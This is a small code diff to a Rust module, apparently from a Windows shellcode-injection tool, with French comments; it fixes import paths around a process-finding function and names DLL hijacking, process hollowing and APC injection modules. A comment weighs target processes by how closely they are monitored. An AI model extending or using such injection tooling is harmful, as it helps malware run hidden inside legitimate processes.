@@ -19,6 +19,8 @@ pub mod dll_hijack;
 pub mod process_hollow;
 pub mod apc;
 
+#[cfg(target_os = "windows")]
+use std::os::windows::ffi::OsStringExt;
 use std::ffi::OsString;
 
 /// InjectionMethod — technique d'injection à utiliser
@@ -63,7 +65,7 @@ pub fn inject_shellcode(shellcode: &[u8], target: &InjectionTarget) -> Result<u3
 ///   3. explorer.exe       — toujours présent mais plus surveillé
 #[cfg(target_os = "windows")]
 pub fn find_target_pid(process_name: &str) -> Option<u32> {
-    use windows_sys::Win32::System::ToolHelp::{
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
         CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
         PROCESSENTRY32W, TH32CS_SNAPPROCESS,
     };
